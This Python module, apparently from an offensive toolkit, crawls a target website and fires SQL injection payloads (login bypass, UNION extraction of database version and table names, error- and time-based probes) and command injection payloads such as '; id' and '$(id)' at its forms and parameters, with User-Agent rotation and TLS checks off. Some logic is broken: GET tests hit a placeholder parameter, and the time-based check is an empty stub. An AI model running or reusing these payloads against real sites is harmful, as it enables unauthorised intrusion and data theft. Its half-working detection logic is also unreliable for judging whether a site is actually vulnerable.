"""SQL Injection & Command Injection Scanner + Exploiter."""
import asyncio, re, random, time
from typing import Optional
from urllib.parse import urljoin, urlencode
import aiohttp
from bs4 import BeautifulSoup
from ..utils.helpers import status, random_ua, severity_tag, cvss_score, save_json, display_table

SQLI_ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL","MySQL Error"),
    (r"Warning.*mysql_.*","MySQL Warning"),
    (r"MySQLSyntaxErrorException","MySQL Exception"),
    (r"valid MySQL result","MySQL Result"),
    (r"PostgreSQL.*ERROR","PostgreSQL Error"),
    (r"Warning.*\Wpg_.*","PostgreSQL Warning"),
    (r"Oracle.*error","Oracle Error"),
    (r"Microsoft OLE DB.*SQL Server","MSSQL Error"),
    (r"ODBC.*Driver","ODBC Error"),
    (r"Unclosed quotation mark","Quote Error"),
    (r"SQLite.*error","SQLite Error"),
    (r"org.hibernate.exception","Hibernate Error"),
    (r"com.mysql.jdbc.exceptions","MySQL JDBC"),
]

SQLI_PAYLOADS = {
    "auth_bypass": [
        ("' OR '1'='1","Basic OR"),
        ("' OR '1'='1' --","OR with comment"),
        ("admin'--","Admin bypass"),
        ("' OR 1=1--","Numeric OR"),
        ("\" OR \"1\"=\"1","Double quote OR"),
        ("') OR ('1'='1","Parenthesis OR"),
    ],
    "union": [
        ("' UNION SELECT NULL--","1 column"),
        ("' UNION SELECT NULL,NULL--","2 columns"),
        ("' UNION SELECT NULL,NULL,NULL--","3 columns"),
        ("' UNION SELECT NULL,NULL,NULL,NULL--","4 columns"),
        ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--","5 columns"),
        ("' UNION SELECT @@version,NULL,NULL--","Version extract"),
        ("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--","Tables"),
    ],
    "error": [
        ("' AND 1=CONVERT(int,@@version)--","MSSQL Error"),
        ("' AND extractvalue(1,concat(0x7e,database()))--","MySQL Error"),
        ("' AND updatexml(1,concat(0x7e,user()),1)--","MySQL XPath"),
    ],
    "time": [
        ("' AND SLEEP(5)--","MySQL Sleep"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","MySQL Subquery Sleep"),
        ("'; WAITFOR DELAY '00:00:05'--","MSSQL Delay"),
        ("' OR pg_sleep(5)--","PostgreSQL Sleep"),
    ],
    "boolean": [
        ("' AND 1=1--","True condition"),
        ("' AND 1=2--","False condition"),
        ("' AND 'a'='a","String true"),
        ("' AND 'a'='b","String false"),
    ],
}

class SQLiScanner:
    """Comprehensive SQL Injection Scanner."""

    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.findings = []
        self.forms = []
        self.params = []
        self.session = None

    async def crawl(self) -> list:
        """Crawl target for forms and parameters."""
        status("Crawling for injection points...", "info")
        headers = {"User-Agent": random_ua()}
        visited = set()
        to_visit = [self.target]

        async with aiohttp.ClientSession() as s:
            self.session = s
            while to_visit and len(visited) < 30:
                url = to_visit.pop(0)
                if url in visited: continue
                try:
                    resp = await s.get(url, headers=headers, timeout=10, ssl=False)
                    if "text/html" not in resp.headers.get("Content-Type",""): continue
                    html = await resp.text()
                    visited.add(url)
                    soup = BeautifulSoup(html, 'html.parser')

                    # Extract forms
                    for form in soup.find_all("form"):
                        action = form.get("action","")
                        method = form.get("method","get").lower()
                        inputs = []
                        for inp in form.find_all(["input","textarea","select"]):
                            name = inp.get("name")
                            if name:
                                inputs.append({"name":name,"type":inp.get("type","text")})
                        if inputs:
                            form_url = urljoin(url, action) if action else url
                            self.forms.append({"url":form_url,"method":method,"inputs":inputs})

                    # Extract links
                    for link in soup.find_all("a", href=True):
                        href = urljoin(url, link["href"])
                        if href.startswith(self.target) and href not in visited:
                            to_visit.append(href)
                except: continue

        status(f"Found {len(self.forms)} forms", "success")
        return self.forms

    async def test_form(self, form: dict) -> list:
        """Test a single form for SQLi."""
        results = []
        headers = {"User-Agent": random_ua(), "Content-Type": "application/x-www-form-urlencoded"}

        for category, payloads in SQLI_PAYLOADS.items():
            for payload, desc in payloads[:3]:
                try:
                    if form["method"] == "get":
                        # Build test URL
                        if "?" in form["url"]:
                            test_url = form["url"] + "&test=" + payload
                        else:
                            test_url = form["url"] + "?test=" + payload
                        resp = await self.session.get(test_url, headers=headers, timeout=8, ssl=False)
                    else:
                        data = {}
                        for inp in form["inputs"]:
                            data[inp["name"]] = payload
                        resp = await self.session.post(form["url"], headers=headers, data=data, timeout=8, ssl=False)

                    html = await resp.text()

                    # Check for SQL errors
                    for pattern, db_type in SQLI_ERROR_PATTERNS:
                        if re.search(pattern, html, re.IGNORECASE):
                            results.append({
                                "type": "SQL Injection",
                                "category": category,
                                "db_type": db_type,
                                "url": form["url"],
                                "method": form["method"].upper(),
                                "payload": payload,
                                "description": desc,
                                "severity": "CRITICAL",
                                "cvss": cvss_score(),
                                "evidence": pattern,
                            })
                            status(f"SQLi found: [{db_type}] at {form['url']}", "critical")
                            return results  # One finding per form is enough

                    # Time-based detection
                    if category == "time" and resp.status == 200:
                        # Simple time check (would be better with timing)
                        pass

                except: continue
        return results

    async def full_scan(self) -> list:
        """Run full SQLi scan."""
        await self.crawl()
        if not self.forms:
            status("No forms found to test", "warning")
            return []

        all_findings = []
        for form in self.forms:
            findings = await self.test_form(form)
            all_findings.extend(findings)

        status(f"SQLi scan complete: {len(all_findings)} finding(s)", "success" if not all_findings else "critical")
        return all_findings


class CommandInjectionScanner:
    """Command Injection Scanner."""

    CMD_PAYLOADS = [
        ("; id", "Unix command"),
        ("&& id", "Unix AND"),
        ("| id", "Unix pipe"),
        ("`id`", "Unix backtick"),
        ("$(id)", "Unix substitution"),
        ("; sleep 10", "Time-based"),
        ("& dir", "Windows command"),
        ("&& whoami", "Windows AND"),
    ]

    CMD_INDICATORS = [
        r"uid=\d+", r"gid=\d+", r"www-data", r"root:",
        r"Windows", r"\[.*\\", r"Directory of",
    ]

    def __init__(self, target: str):
        self.target = target
        self.findings = []

    async def test(self, url: str, param: str) -> list:
        results = []
        headers = {"User-Agent": random_ua()}
        async with aiohttp.ClientSession() as s:
            for payload, desc in self.CMD_PAYLOADS:
                try:
                    test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                    resp = await s.get(test_url, headers=headers, timeout=8, ssl=False)
                    html = await resp.text()

                    for pattern in self.CMD_INDICATORS:
                        if re.search(pattern, html, re.IGNORECASE):
                            results.append({
                                "type": "Command Injection",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "description": desc,
                                "severity": "CRITICAL",
                                "cvss": cvss_score(),
                            })
                            status(f"CMD Injection: {url} [{param}]", "critical")
                            return results
                except: continue
        return results
